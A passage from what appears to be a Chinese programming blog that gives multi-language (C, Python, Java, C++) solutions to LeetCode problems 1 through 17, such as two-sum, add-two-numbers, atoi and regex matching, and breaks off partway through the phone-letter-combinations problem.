7 = 9所以返回 [0, 1]c语言 12345678910111213int* twoSum(int* nums, int numsSize, int target) &#123; static int a[2]=&#123;0&#125;; for(int i=0;i&lt;numsSize;i++)&#123; for(int j=i+1;j&lt;numsSize;j++)&#123; if(nums[i]+nums[j]==target)&#123; a[0]=i; a[1]=j; return a; &#125; &#125; &#125; return 0;&#125; python 12345678910111213141516class Solution(object): def twoSum(self, nums, target): d=&#123;&#125; size=0 while size&lt;len(nums): if nums[size] not in d: d[nums[size]]=size if (target-nums[size]) in d: if d[target-nums[size]] &lt;size: return (d[target-nums[size]],size) size += 1sum1=Solution()nums=[2, 7, 11, 15]target = 9sum=sum1.twoSum(nums,target)print(sum) java 123456789101112131415161718192021222324252627import java.util.HashMap;import java.util.Map;public class Solution &#123; public int[] twoSum(int[] nums, int target) &#123; int[] result=new int[2]; Map&lt;Integer,Integer&gt; map=new HashMap&lt;&gt;(); for(int i=0;i&lt;nums.length;i++) &#123; int tmp=target-nums[i]; if(map.containsKey(tmp)) &#123; result[0]=map.get(tmp); result[1]=i; &#125;else &#123; map.put(nums[i], i); &#125; &#125; return result; &#125; public static void main(String[] args) &#123; // TODO Auto-generated method stub int[] nums = new int[]&#123;2, 7, 11, 15&#125;; int target = 9; int[] result=new Solution().twoSum(nums,target); System.out.println(result[0]+\" \"+result[1]); &#125;&#125; 0x2 两数相加给出两个 非空 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 逆序 的方式存储的，并且它们的每个节点只能存储 一位 数字。 如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。 您可以假设除了数字 0 之外，这两个数都不会以 0 开头。 示例： 输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)输出：7 -&gt; 0 -&gt; 8原因：342 + 465 = 807 c语言 123456789101112131415161718192021222324252627282930313233343536373839struct ListNode* addTwoNumbers(struct ListNode* l1, struct ListNode* l2) &#123; struct ListNode *head,*rear = NULL,*p; int value = 0; while(l1 || l2) &#123; if(l1) &#123; value += l1-&gt;val; l1 = l1-&gt;next; &#125; if(l2) &#123; value += l2-&gt;val; l2 = l2-&gt;next; &#125; p = (struct ListNode *)malloc(sizeof(struct ListNode)); p-&gt;val = value%10; value = value / 10; p-&gt;next = NULL; if(rear == NULL) &#123; rear = p; head = rear; &#125; else &#123; rear-&gt;next = p; rear = p; &#125; &#125; if(value) &#123; p = (struct ListNode *)malloc(sizeof(struct ListNode)); p-&gt;val = value; p-&gt;next = NULL; rear-&gt;next = p; &#125; return head;&#125; python 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152class ListNode: def __init__(self, x): self.val = x self.next = Noneclass Solution: def addTwoNumbers(self, l1, l2): \"\"\" :type l1: ListNode :type l2: ListNode :rtype: ListNode \"\"\" ans = ListNode(0) temp = ans tempsum = 0 while True: if (l1 != None): tempsum = l1.val + tempsum l1 = l1.next if (l2 != None): tempsum = tempsum + l2.val l2 = l2.next temp.val = tempsum % 10 tempsum = int(tempsum / 10) if l1 == None and l2 == None and tempsum == 0: break temp.next = ListNode(0) temp = temp.next return ansif __name__ == \"__main__\": t1 = ListNode(3) t2 = ListNode(4) t2.next = t1 t3 = ListNode(2) t3.next = t2 b1 = ListNode(4) b2 = ListNode(6) b2.next = b1 b3 = ListNode(5) b3.next = b2 result = Solution() add_sum = result.addTwoNumbers(t3, b3) while (add_sum != None): print(add_sum.val) add_sum = add_sum.next java 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556class ListNode &#123; int val; ListNode next; ListNode(int x) &#123; val = x; &#125;&#125;public class Solution &#123; public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123; //定义满十进一的数 int num = 0; //定义一个ListNode，作为链表头 ListNode proNode = new ListNode(0); //定义一个ListNode，接受两数的和 ListNode currentNode = new ListNode(0); //先连接两个Node proNode.next=currentNode; do &#123; //两数相加 int sum = (l1!=null?l1.val:0) + (l2!=null?l2.val:0) + num; //是否满十 num = sum/10; //得出个位数 int result = sum%10; //填入结果 currentNode.val = result; l1 = l1!=null?l1.next:l1; l2 = l2!=null?l2.next:l2; if(l1!=null || l2!=null || num!=0) &#123; currentNode.next = new ListNode(0); currentNode = currentNode.next; &#125; &#125;while(l1!=null || l2!=null || num!=0); return proNode.next; &#125; public static void main(String[] args) &#123; // TODO Auto-generated method stub ListNode a1=new ListNode(2); ListNode a2=new ListNode(4); ListNode a3=new ListNode(3); a1.next=a2; a2.next=a3; ListNode b1=new ListNode(5); ListNode b2=new ListNode(6); ListNode b3=new ListNode(4); b1.next=b2; b2.next=b3; ListNode c1=new Solution().addTwoNumbers(a1,b1); while(c1!=null)&#123; System.out.println(c1.val); c1=c1.next; &#125; &#125;&#125; 0x3 无重复字符的最长子串给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度。 示例 1: 输入: “abcabcbb”输出: 3解释: 因为无重复字符的最长子串是 “abc”，所以其长度为 3。示例 2: 输入: “bbbbb”输出: 1解释: 因为无重复字符的最长子串是 “b”，所以其长度为 1。示例 3: 输入: “pwwkew”输出: 3解释: 因为无重复字符的最长子串是 “wke”，所以其长度为 3。 请注意，你的答案必须是 子串 的长度，”pwke” 是一个子序列，不是子串。python 12345678910111213141516171819class Solution: def lengthOfLongestSubstring(self, s): \"\"\" :type s: str :rtype: int \"\"\" start = maxLength = 0 usedChar = &#123;&#125; for index, char in enumerate(s): if char in usedChar and start &lt;= usedChar[char]: start = usedChar[char] + 1 else: maxLength = max(maxLength, index - start + 1) usedChar[char] = index return maxLengths=\"asdqwes\"solution=Solution()maxlength=solution.lengthOfLongestSubstring(s)print(maxlength) java 12345678910111213141516171819202122232425262728import java.util.HashMap;import java.util.Map;public class Solution &#123; public int lengthOfLongestSubstring(String s) &#123; int n=s.length(); int res=0; int end=0,start=0; Map&lt;Character,Integer&gt; map=new HashMap&lt;&gt;(); for(;start&lt;n&amp;&amp;end&lt;n;end++) &#123; if(map.containsKey(s.charAt(end))) &#123; start=Math.max(map.get(s.charAt(end)), start); &#125; map.put(s.charAt(end), end+1); res=Math.max(res, end-start+1); &#125; return res; &#125; public static void main(String[] args) &#123; String s=\"qweqweasd\"; int maxlength=new Solution().lengthOfLongestSubstring(s); System.out.println(maxlength); &#125;&#125; 0x4 寻找两个有序数组的中位数给定两个大小为 m 和 n 的有序数组 nums1 和 nums2。 请你找出这两个有序数组的中位数，并且要求算法的时间复杂度为 O(log(m + n))。 你可以假设 nums1 和 nums2 不会同时为空。 示例 1: nums1 = [1, 3]nums2 = [2] 则中位数是 2.0示例 2: nums1 = [1, 2]nums2 = [3, 4] 则中位数是 (2 + 3)/2 = 2.5 java 123456789101112131415161718192021222324252627public class middle &#123; public double findMedianSortedArrays(int[] nums1, int[] nums2) &#123; int[] nums3=new int[nums1.length+nums2.length]; for(int i=0;i&lt;nums1.length;i++) &#123; nums3[i]=nums1[i]; &#125; for(int j=0;j&lt;nums2.length;j++) &#123; nums3[nums1.length+j]=nums2[j]; &#125; Arrays.sort(nums3); return (nums3.length%2==1) ?nums3[nums3.length/2]:(nums3[nums3.length/2-1]+nums3[nums3.length/2])/2.0; &#125; public static void main(String[] args) &#123; // TODO Auto-generated method stub int[] num1= &#123;1,2,3,4&#125;; int[] num2= &#123;5,6,7,8&#125;; double num3; num3=new middle().findMedianSortedArrays(num1,num2); System.out.println(num3); &#125;&#125; python 1234567891011121314class Solution(object): def findMedianSortedArrays(self, nums1, nums2): \"\"\" :type nums1: List[int] :type nums2: List[int] :rtype: float \"\"\" nums3=nums1+nums2 nums3.sort() length=len(nums3) if length%2: return nums3[int(length/2)] else: return (nums3[int(length/2)-1]+nums3[int(length/2)])/2.0 0x5最长回文子串给定一个字符串 s，找到 s 中最长的回文子串。你可以假设 s 的最大长度为 1000。 示例 1： 输入: “babad”输出: “bab”注意: “aba” 也是一个有效答案。示例 2： 输入: “cbbd”输出: “bb” java 123456789101112131415161718192021222324252627282930public String findPalindrome(String s,int left,int right) &#123; int n=s.length(); int l=left; int r=right; while(l&gt;=0&amp;&amp;r&lt;=n-1&amp;&amp;s.charAt(l)==s.charAt(r)) &#123; l--; r++; &#125; return s.substring(l+1,r); &#125; public String longestPalindrome(String s) &#123; int n=s.length(); if(n&lt;=1) return s; String longest=\"\"; String str; for(int i=0;i&lt;n-1;i++) &#123; str=findPalindrome(s,i,i); if(str.length()&gt;longest.length()) &#123; longest=str; &#125; str=findPalindrome(s,i,i+1); if(str.length()&gt;longest.length()) &#123; longest=str; &#125; &#125; return longest; &#125; python解法详情看https://blog.csdn.net/asd136912/article/details/78987624 0x6. Z 字形变换将一个给定字符串根据给定的行数，以从上往下、从左到右进行 Z 字形排列。 比如输入字符串为 “LEETCODEISHIRING” 行数为 3 时，排列如下： L C I RE T O E S I I GE D H N之后，你的输出需要从左往右逐行读取，产生出一个新的字符串，比如：”LCIRETOESIIGEDHN”。 请你实现这个将字符串进行指定行数变换的函数： string convert(string s, int numRows);示例 1: 输入: s = “LEETCODEISHIRING”, numRows = 3输出: “LCIRETOESIIGEDHN”示例 2: 输入: s = “LEETCODEISHIRING”, numRows = 4输出: “LDREOEIIECIHNTSG”解释: L D RE O E I IE C I H NT S Gpython 123456789101112131415161718class solution: def convert(self,s,numRows): strLength=len(s) nodeLength=2*numRows-2 result=\"\" if strLength==0 or numRows==0 or numRows==1: return s for i in range(numRows): for j in range(i,strLength,nodeLength): result += s[j] if i!=0 and i!=numRows-1 and j-2*i+nodeLength&lt;strLength: result += s[j-2*i+nodeLength] return results = \"LEETCODEISHIRING\"numRows = 3solution=solution()ans=solution.convert(s,numRows)print ans C++ 12345678910111213141516171819202122232425262728#include&lt;iostream&gt;using namespace std;class Solution &#123;public: string convert(string s, int numRows) &#123; if(numRows&lt;=1) return s; string res=\"\"; int size=2*numRows-2; for(int i=0;i&lt;numRows;i++)&#123; for(int j=i;j&lt;s.size();j+=size)&#123; res+=s[j]; int tmp=j+size-2*i; if(i!=0&amp;&amp;i!=numRows-1&amp;&amp;tmp&lt;s.size()) res+=s[tmp]; &#125; &#125; return res; &#125;&#125;;int main()&#123; string s = \"LEETCODEISHIRING\"; int numRows = 3; Solution sol; string res=sol.convert(s,numRows); cout&lt;&lt;res&lt;&lt;endl;&#125; java 123456789101112131415161718192021222324252627282930313233343536package algorithmic;public class ztransform &#123; public String convert(String s, int numRows) &#123; if(s==null||s.length()==0||numRows==1||numRows&gt;=s.length()) &#123; return s; &#125; StringBuilder sb = new StringBuilder(); for(int i=1;i&lt;s.length()+1;i+=2*(numRows-1)) &#123; sb.append(s.charAt(i-1)); &#125; for(int i=2;i&lt;numRows;i++) &#123; boolean k = true; for(int j=i;j&lt;s.length()+1;j+=(k)?2*(numRows-i):2*(i-1),k=!k) &#123; sb.append(s.charAt(j-1)); &#125; &#125; for(int i=numRows;i&lt;s.length()+1;i+=2*(numRows-1)) &#123; sb.append(s.charAt(i-1)); &#125; return sb.toString(); &#125; public static void main(String[] args) &#123; // TODO Auto-generated method stub String s = \"LEETCODEISHIRING\"; int numRows = 3; String result=new ztransform().convert(s, numRows); System.out.println(result); &#125;&#125; 0x7 整数反转给出一个 32 位的有符号整数，你需要将这个整数中每位上的数字进行反转。 示例 1: 输入: 123输出: 321 示例 2: 输入: -123输出: -321示例 3: 输入: 120输出: 21 C语言 1234567891011121314151617181920#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int reverse(int x) &#123; long tmp, result=0; while(x)&#123; tmp=x%10; result=result*10+tmp; x=x/10; &#125; if(result&lt;INT_MIN||result&gt;INT_MAX)&#123; return 0; &#125; return result;&#125;int main()&#123; long x=12346578; printf(\"%d\",reverse(x)); return 0;&#125; python 123456789101112131415161718192021222324class Solution(object): def reverse(self, x): \"\"\" :type x: int :rtype: int \"\"\" s=str(x) x=0 if s[0]=='-': for i in range(len(s)-1): x=x*10+int(s[-1-i]) if x&gt;2**31: return 0 return -x else: for i in range(len(s)): x=x*10+int(s[-i-1]) if x&gt;2**31-1: return 0 return xx=-123456789so=Solution()print so.reverse(x) java 1234567891011121314151617181920212223package algorithmic;public class reverse &#123; public int reverse1(int x) &#123; int result=0,tmp; while(x!=0) &#123; tmp=result*10+x%10; x=x/10; if(result&gt;Integer.MAX_VALUE/10||result&lt;Integer.MIN_VALUE/10) &#123; return 0; &#125; result=tmp; &#125; return result; &#125; public static void main(String[] args) &#123; // TODO Auto-generated method stub int x=-123456; int out=new reverse().reverse1(x); System.out.println(out); &#125;&#125; 0x8 字符串转换整数 (atoi)请你来实现一个 atoi 函数，使其能将字符串转换成整数。 首先，该函数会根据需要丢弃无用的开头空格字符，直到寻找到第一个非空格的字符为止。 当我们寻找到的第一个非空字符为正或者负号时，则将该符号与之后面尽可能多的连续数字组合起来，作为该整数的正负号；假如第一个非空字符是数字，则直接将其与之后连续的数字字符组合起来，形成整数。 该字符串除了有效的整数部分之后也可能会存在多余的字符，这些字符可以被忽略，它们对于函数不应该造成影响。 注意：假如该字符串中的第一个非空格字符不是一个有效整数字符、字符串为空或字符串仅包含空白字符时，则你的函数不需要进行转换。 在任何情况下，若函数不能进行有效的转换时，请返回 0。 说明： 假设我们的环境只能存储 32 位大小的有符号整数，那么其数值范围为 [−231, 231 − 1]。如果数值超过这个范围，qing返回 INT_MAX (231 − 1) 或 INT_MIN (−231) 。 示例 1: 输入: “42”输出: 42示例 2: 输入: “ -42”输出: -42解释: 第一个非空白字符为 ‘-‘, 它是一个负号。 我们尽可能将负号与后面所有连续出现的数字组合起来，最后得到 -42 。示例 3: 输入: “4193 with words”输出: 4193解释: 转换截止于数字 ‘3’ ，因为它的下一个字符不为数字。示例 4: 输入: “words and 987”输出: 0解释: 第一个非空字符是 ‘w’, 但它不是数字或正、负号。 因此无法执行有效的转换。示例 5: 输入: “-91283472332”输出: -2147483648解释: 数字 “-91283472332” 超过 32 位有符号整数范围。 因此返回 INT_MIN (−231) 。java 123456789101112131415161718192021222324252627282930313233package algorithmic;public class stoi &#123; public int myAtoi(String str) &#123; str=str.trim(); if(str.isEmpty()) return 0; int sign=1; int base=0; int i=0; if(str.charAt(i)=='-'||str.charAt(i)=='+') &#123; sign=str.charAt(i++)=='-'? -1:1; &#125; while(i&lt;str.length()&amp;&amp;str.charAt(i)&gt;='0'&amp;&amp;str.charAt(i)&lt;='9') &#123; if(base&gt;Integer.MAX_VALUE/10||(base==Integer.MAX_VALUE/10&amp;&amp;str.charAt(i)-'0'&gt;7)) &#123; return (sign==1)?Integer.MAX_VALUE:Integer.MIN_VALUE; &#125; base=10*base+(str.charAt(i++)-'0'); &#125; return base*sign; &#125; public static void main(String[] args) &#123; // TODO Auto-generated method stub String str=\" 1231234sdf\"; int in=new stoi().myAtoi(str); System.out.println(in); &#125;&#125; python 1234567891011121314151617181920212223class Solution(object): def myAtoi(self, str): \"\"\" :type str: str :rtype: int \"\"\" str=str.strip() import re pattern=r\"[\\s]*[+-]?[\\d]+\" match=re.match(pattern,str) if match: res=int(match.group(0)) if res&gt;2**31-1: return 2**31-1 if res&lt;-2**31: return 2**31 else: return 0 return ress=\" 12312412qweqwewq\"so=Solution()num=so.myAtoi(s)print num C语言 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; int myAtoi(char* str) &#123; bool flag=false; int tMax=INT_MAX/10; int i=0,t=0,result=0; while(str[i])&#123; if(str[i]=='-')&#123; flag=true; break; &#125; else if(str[i]=='+'||str[i]&gt;=48&amp;&amp;str[i]&lt;=57)&#123; break; &#125; else if(str[i]!=' ') return 0; i++; &#125; if(str[i]=='-'||str[i]=='+') i++; while(str[i])&#123; if(str[i]&gt;=48&amp;&amp;str[i]&lt;57)&#123; t=str[i]-'0'; if(result&gt;tMax) return flag?INT_MIN:INT_MAX; else if(result==tMax&amp;&amp;flag&amp;&amp;t&gt;8) return INT_MIN; else if(result==tMax&amp;&amp;!flag&amp;&amp;t&gt;7) return INT_MAX; else result=result*10+t; &#125;else&#123; break; &#125; i++; &#125; return flag? -result:result; &#125; int main()&#123; char st[40]=\" 123456qweqwrqw\"; int i; i=myAtoi(st); printf(\"%d\",i); return 0;&#125; 0x9.回文数判断一个整数是否是回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。 示例 1: 输入: 121输出: true示例 2: 输入: -121输出: false解释: 从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。示例 3: 输入: 10输出: false解释: 从右向左读, 为 01 。因此它不是一个回文数 c语言 123456789101112131415161718#include&lt;stdio.h&gt; bool isPalindrome(int x) &#123; int result=0; if(x==0) return true; if(x&lt;0||x%10==0) return false; while(x&gt;result)&#123; result=result*10+x%10; x /=10; &#125; return (x==result||result/10==x);&#125;int main()&#123; int num=121; bool flag=isPalindrome(num); printf(\"%d\",flag); &#125; python 123456789101112class Solution(object): def isPalindrome(self, x): \"\"\" :type x: int :rtype: bool \"\"\" st=str(x) st1=st[len(st)::-1] return st1==stx=121so=Solution()print so.isPalindrome(x) java 123456789101112131415161718192021222324252627package algorithmic;public class ispalindrome &#123; public boolean isPalindrome(int x) &#123; String str=String.valueOf(x); int i=0; int len=str.length(); while(i&lt;len/2) &#123; if(str.charAt(i)==str.charAt(len-i-1)) &#123; i++; &#125;else&#123; return false; &#125; &#125; return true; &#125; public static void main(String[] args) &#123; // TODO Auto-generated method stub int x=121; boolean flag=new ispalindrome().isPalindrome(x); System.out.println(flag); &#125;&#125; 0x10. 正则表达式匹配给定一个字符串 (s) 和一个字符模式 (p)。实现支持 ‘.’ 和 ‘*’ 的正则表达式匹配。 ‘.’ 匹配任意单个字符。‘*’ 匹配零个或多个前面的元素。匹配应该覆盖整个字符串 (s) ，而不是部分字符串。 说明: s 可能为空，且只包含从 a-z 的小写字母。p 可能为空，且只包含从 a-z 的小写字母，以及字符 . 和 *。示例 1: 输入:s = “aa”p = “a”输出: false解释: “a” 无法匹配 “aa” 整个字符串。示例 2: 输入:s = “aa”p = “a*”输出: true解释: ‘*’ 代表可匹配零个或多个前面的元素, 即可以匹配 ‘a’ 。因此, 重复 ‘a’ 一次, 字符串可变为 “aa”。示例 3: 输入:s = “ab”p = “.*”输出: true解释: “.*” 表示可匹配零个或多个(‘*’)任意字符(‘.’)。示例 4: 输入:s = “aab”p = “cab”输出: true解释: ‘c’ 可以不被重复, ‘a’ 可以被重复一次。因此可以匹配字符串 “aab”。示例 5: 输入:s = “mississippi”p = “misis*p.”输出: false python 12345678910111213141516171819202122232425class Solution(object): def isMatch(self, s, p): \"\"\" :type s: str :type p: str :rtype: bool \"\"\" if p==\"\": return s==\"\" if len(p)==1: return len(s)==1 and (s[0]==p[0] or p[0]=='.') if p[1]!=\"*\": if s==\"\": return False return (s[0]==p[0] or p[0]=='.') and self.isMatch(s[1:],p[1:]) while s and(s[0]==p[0] or p[0]=='.'): if self.isMatch(s,p[2:]): return True s=s[1:] return self.isMatch(s,p[2:])s=\"test\"p=\"t*\"so=Solution()S=so.isMatch(s,p)print S java 1234567891011121314151617181920212223242526272829public class q10 &#123; public boolean isMatch(String s, String p) &#123; if(p.isEmpty()) return s.isEmpty(); boolean first_match=(!s.isEmpty()&amp;&amp;p.charAt(0)==s.charAt(0)||p.charAt(0)=='.'); if(p.length()&gt;=2&amp;&amp;p.charAt(1)=='*') &#123; //看有没有可能,剩下的pattern匹配上全部的text //看有没有可能,剩下的text匹配整个pattern //isMatch(text, pattern.substring(2)) 指当p第二个为*时，前面的字符不影响匹配所以可以忽略，所以将*以及*之前的一个字符删除后匹配之后的字符，这就是为什么用pattern.substring(2) //如果第一个已经匹配成功，并且第二个字符为*时，这是我们就要判断之后的需要匹配的字符串是否是多个前面的元素（*的功能），这就是first_match &amp;&amp; isMatch(text.substring(1), pattern))的意义！ return (isMatch(s,p.substring(2)))||(first_match&amp;&amp;isMatch(s.substring(1), p)); &#125;else &#123; //没有星星的情况下:第一个字符相等，而且剩下s,匹配上剩下的p,没有星星且第一个匹配成功，那么s和p同时向右移动一位看是否仍然能匹配成功 return first_match&amp;&amp;isMatch(s.substring(1),p.substring(1)); &#125; &#125; public static void main(String[] args) &#123; // TODO Auto-generated method stub String s=\"qwe123\"; String p=\"qwe\"; boolean flag=new q10().isMatch(s,p); System.out.println(flag); &#125;&#125; c 12345678910111213141516171819202122232425262728293031323334353637#include&lt;stdio.h&gt;bool isMatch(char *s,char *p)&#123; if(p[0]=='\\0') &#123; return s[0]=='\\0'; &#125; if(s[0]=='\\0') &#123; if(p[1]=='*') &#123; return isMatch(s,p+2); &#125; return false; &#125; if(p[1]=='*') &#123; if(s[0]==p[0]||p[0]=='.') &#123; if(strlen(p)&gt;=4 &amp;&amp; p[0]==p[2] &amp;&amp; p[3]=='*') return isMatch(s,p+2);//此处总觉得是有些取巧，针对超时 return isMatch(s+1,p)||isMatch(s+1,p+2)||isMatch(s,p+2); &#125; else &#123; return isMatch(s,p+2); &#125; &#125; else &#123; if(s[0]==p[0]||p[0]=='.') &#123; return isMatch(s+1,p+1); &#125; &#125; return false;&#125; 0x11. 盛最多水的容器给定 n 个非负整数 a1，a2，…，an，每个数代表坐标中的一个点 (i, ai) 。在坐标内画 n 条垂直线，垂直线 i 的两个端点分别为 (i, ai) 和 (i, 0)。找出其中的两条线，使得它们与 x 轴共同构成的容器可以容纳最多的水。 说明：你不能倾斜容器，且 n 的值至少为 2。 图中垂直线代表输入数组 [1,8,6,2,5,4,8,3,7]。在此情况下，容器能够容纳水（表示为蓝色部分）的最大值为 49。 示例: 输入: [1,8,6,2,5,4,8,3,7]输出: 49java 12345678910111213141516171819202122232425public class q11 &#123;public int maxArea(int[] height) &#123; int len=height.length; int area; int max=0; for(int i=0;i&lt;len;i++) &#123; for(int j=i+1;j&lt;len;j++) &#123; int hei=(height[i]&gt;height[j])?height[j]:height[i]; area =hei*(j-i); if(area&gt;max) max=area; &#125; &#125; return max; &#125;public static void main(String[] args) &#123; // TODO Auto-generated method stub int[] s= &#123;1,8,6,2,5,4,8,3,7&#125;; System.out.println(new q11().maxArea(s)); &#125;&#125; python 12345678910111213141516171819class Solution(object): def maxArea(self, height): \"\"\" :type height: List[int] :rtype: int \"\"\" maxArea=0 left=0 right=len(height)-1 while right &gt;left: maxArea=max(maxArea,min(height[left],height[right])*(right-left)) if height[right]&gt;height[left]: left+=1 else: right-=1 return maxAreas=[1,8,6,2,5,4,8,3,7]so=Solution()print so.maxArea(s) c++ 123456789101112131415161718192021222324252627282930313233343536#include&lt;math.h&gt; #include&lt;vector&gt;#include&lt;iostream&gt;using namespace std;class Solution &#123;public:int maxArea(vector&lt;int&gt;&amp; height)&#123; int s=height.size(); //vector&lt;vector&lt;int&gt; &gt;dp(s,vector&lt;int&gt;(s)); int i=0,j=s-1; int temp=0,maxarea=0; while(i&lt;j) &#123; temp=min(height[i],height[j])*(j-i); maxarea=maxarea&gt;temp?maxarea:temp; if(height[i]&gt;height[j]) &#123; j--; &#125; else i++; &#125; return maxarea;&#125;&#125;;int main()&#123; int s[]=&#123;1,8,6,2,5,4,8,3,7&#125;; Solution so; vector &lt;int&gt; s1; for(int i=0;s[i]!='\\0';i++) s1.push_back(s[i]); int a=so.maxArea(s1); cout&lt;&lt;a; return 0;&#125; 0x12 整数转罗马数字罗马数字包含以下七种字符： I， V， X， L，C，D 和 M。 字符 数值I 1V 5X 10L 50C 100D 500M 1000例如， 罗马数字 2 写做 II ，即为两个并列的 1。12 写做 XII ，即为 X + II 。 27 写做 XXVII, 即为 XX + V + II 。 通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 IIII，而是 IV。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 IX。这个特殊的规则只适用于以下六种情况： I 可以放在 V (5) 和 X (10) 的左边，来表示 4 和 9。X 可以放在 L (50) 和 C (100) 的左边，来表示 40 和 90。C 可以放在 D (500) 和 M (1000) 的左边，来表示 400 和 900。给定一个整数，将其转为罗马数字。输入确保在 1 到 3999 的范围内。 示例 1: 输入: 3输出: “III”示例 2: 输入: 4输出: “IV”示例 3: 输入: 9输出: “IX”示例 4: 输入: 58输出: “LVIII”解释: L = 50, V = 5, III = 3.示例 5: 输入: 1994输出: “MCMXCIV”解释: M = 1000, CM = 900, XC = 90, IV = 4.java 1234567891011121314151617 public String intToRoman(int num) &#123; int[] numArray = new int[] &#123;1000,900,500,400,100,90,50,40,10,9,5,4,1&#125;; String [] strArray = new String[] &#123;\"M\",\"CM\",\"D\",\"CD\",\"C\",\"XC\",\"L\",\"XL\",\"X\",\"IX\",\"V\",\"IV\",\"I\"&#125;;StringBuffer res=new StringBuffer();if(num&lt;1 &amp;&amp;num&gt;3999) return null;for(int i=0;i&lt;numArray.length;i++) &#123; int tmp=num/numArray[i]; while(tmp&gt;0) &#123; res.append(strArray[i]); tmp--; &#125; num=num%numArray[i];&#125; return res.toString(); &#125; 0x13 罗马数字转整数java 1234567891011121314151617181920212223class Solution &#123; public int romanToInt(String s) &#123; Map&lt;Character,Integer&gt; map=new HashMap&lt;Character,Integer&gt;(); map.put('I', 1); map.put('V', 5); map.put('X', 10); map.put('L', 50); map.put('C', 100); map.put('D', 500); map.put('M', 1000); int result=map.get(s.charAt(s.length()-1)); for(int i=s.length()-2;i&gt;=0;i--) &#123; if(map.get(s.charAt(i))&gt;=map.get(s.charAt(i+1))) &#123; result+=map.get(s.charAt(i)); &#125;else &#123; result-=map.get(s.charAt(i)); &#125; &#125; return result; &#125;&#125; python 12345678910111213141516class Solution(object): def romanToInt(self, s): \"\"\" :type s: str :rtype: int \"\"\" sum=0 convert=&#123;'M': 1000,'D': 500 ,'C': 100,'L': 50,'X': 10,'V': 5,'I': 1&#125; for i in range(len(s)-1): if convert[s[i]] &lt; convert[s[i+1]]: sum -= convert[s[i]] else: sum += convert[s[i]] sum += convert[s[-1]] return sum 0x14 最长公共前缀123456789101112131415161718192021class Solution &#123; public String longestCommonPrefix(String[] strs) &#123; StringBuilder s=new StringBuilder(); if(strs.length==0) &#123; return \"\"; &#125; for(int i=0;i&lt;strs[0].length();i++) &#123; for(int j=1;j&lt;strs.length;j++) &#123; if(i&gt;=strs[j].length()||strs[0].charAt(i)!=strs[j].charAt(i)) &#123; return s.toString(); &#125; &#125; s.append(strs[0].charAt(i)); &#125; return s.toString(); &#125;&#125; c++ 12345678910111213class Solution &#123;public: string longestCommonPrefix(vector&lt;string&gt;&amp; strs) &#123; if(strs.empty()) return \"\"; for(int i=0;i&lt;strs[0].size();i++)&#123; for(int j=1;j&lt;strs.size();j++)&#123; if(strs[j][i]!=strs[0][i]) return strs[0].substr(0,i); &#125; &#125; return strs[0]; &#125;&#125;; python 1234567891011121314class Solution(object): def longestCommonPrefix(self, strs): \"\"\" :type strs: List[str] :rtype: str \"\"\" if not strs: return \"\" shorest=min(strs,key=len) for i,letter in enumerate(shorest): for other in strs: if other[i] != letter: return shorest[:i] return shorest 0x15 三数之和给定一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c = 0 ？找出所有满足条件且不重复的三元组。 注意：答案中不可以包含重复的三元组。 1234567例如, 给定数组 nums = [-1, 0, 1, 2, -1, -4]，满足要求的三元组集合为：[ [-1, 0, 1], [-1, -1, 2]] 1234567891011121314151617181920212223242526272829303132333435363738394041 public List&lt;List&lt;Integer&gt;&gt; threeSum(int[] nums) &#123; List&lt;List&lt;Integer&gt;&gt; result=new ArrayList&lt;&gt;(); if(nums==null||nums.length&lt;3) &#123; return result; &#125; Arrays.sort(nums); // 注意：只有排序数组才可以利用下面的解法 for(int i=0;i&lt;nums.length;i++) &#123; // 对第一层元素去重(去重的目的是防止出现重复三元组结果.) if(i&gt;0&amp;&amp;nums[i]==nums[i-1]) &#123; continue; &#125; int j=i+1; int k=nums.length-1; while(j&lt;k) &#123; int sum=nums[i]+nums[j]+nums[k]; if(sum==0) &#123; List&lt;Integer&gt; list=new ArrayList&lt;&gt;(); list.add(nums[i]); list.add(nums[j]); list.add(nums[k]); result.add(list); // 对第二层元素去重处理 while(j&lt;k&amp;&amp;nums[j]==nums[j+1]) &#123; j++; &#125; while(j&lt;k&amp;&amp;nums[k]==nums[k-1] ) &#123; k--; &#125; j++; k--; &#125;else if(sum&gt;0) &#123; k--; &#125;else &#123; j++; &#125; &#125; &#125;return result; &#125; 0x16 最接近的三数之和给定一个包括 n 个整数的数组 nums 和 一个目标值 target。找出 nums 中的三个整数，使得它们的和与 target 最接近。返回这三个数的和。假定每组输入只存在唯一答案。 123例如，给定数组 nums = [-1，2，1，-4], 和 target = 1.与 target 最接近的三个数的和为 2. (-1 + 2 + 1 = 2). 1234567891011121314151617181920212223242526272829303132class Solution &#123; public int threeSumClosest(int[] nums, int target) &#123; // 排序 // 遍历 // 寻找当前元素后面的最接近的两数之和 // 双指针算法，等于就输出，否则就向中间移动直至相遇 Arrays.sort(nums); int closest = Integer.MAX_VALUE; int direction = -1; for(int i = 0; i &lt; nums.length; ++i)&#123; for(int j = i+1, k = nums.length-1; j &lt; k;)&#123; int sum = nums[i] + nums[j] + nums[k]; if(target == sum) return sum; else if(target &gt; sum)&#123; if(target-sum &lt; closest)&#123; closest = target-sum; direction = -1; &#125; ++j; &#125;else &#123; if(sum-target &lt; closest)&#123; closest = sum-target; direction = 1; &#125; --k; &#125; &#125; &#125; return target + direction*closest; &#125;&#125; 0x17 电话号码的字母组合给定一个仅包含数字 2-9 的字符串，返回所有它能表示的字母组合。 给出数字到字母的映射如下（与电话按键相同）。注意 1 不对应任何字母。 123456示例:输入：\"23\"输出：[\"ad\", \"ae\", \"af\", \"bd\", \"be\", \"bf\", \"cd\", \"ce\", 